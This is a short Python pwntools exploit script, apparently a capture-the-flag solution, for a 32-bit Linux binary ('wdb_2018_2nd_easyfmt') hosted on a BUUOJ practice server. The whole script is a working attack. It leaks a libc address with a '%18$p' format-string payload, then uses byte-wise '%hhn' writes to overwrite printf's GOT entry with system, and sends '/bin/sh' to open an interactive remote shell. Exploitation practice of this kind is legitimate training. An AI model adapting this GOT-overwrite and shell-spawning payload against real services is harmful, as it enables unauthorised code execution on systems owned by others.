from pwn import *

context(os = 'linux', arch = 'i386', log_level = 'debug')
# io = process('wdb_2018_2nd_easyfmt')
io = remote('node4.buuoj.cn', 25538)
# libc = ELF('/lib/i386-linux-gnu/libc.so.6')
libc = ELF('libc-2.23.so')
elf = ELF('wdb_2018_2nd_easyfmt')
printf_got = elf.got['printf']

payload = b'%18$p'
io.sendafter('Do you know repeater?\n', payload)
libc_base = int(io.recvline()[:-1], 16) - 0xcdc8
log.success('libc_base: ' + hex(libc_base))

system = libc_base + libc.sym['system']
payload = p32(printf_got) + p32(printf_got + 1) + p32(printf_got + 2) + p32(printf_got + 3)
cur_size = 0x10
for i in range(3):
    target_size = (system & (0xff << (i * 8))) >> (i * 8)
    if target_size > cur_size:
        payload += b'%' + str.encode(str(target_size - cur_size)) + b'c'
    else:
        payload += b'%' + str.encode(str(0x100 + target_size - cur_size)) + b'c'
    payload += b'%' + str.encode(str(i + 6)) + b'$hhn'
    cur_size = target_size
io.send(payload)
io.recv()
io.send(b'/bin/sh\x00')
io.interactive()
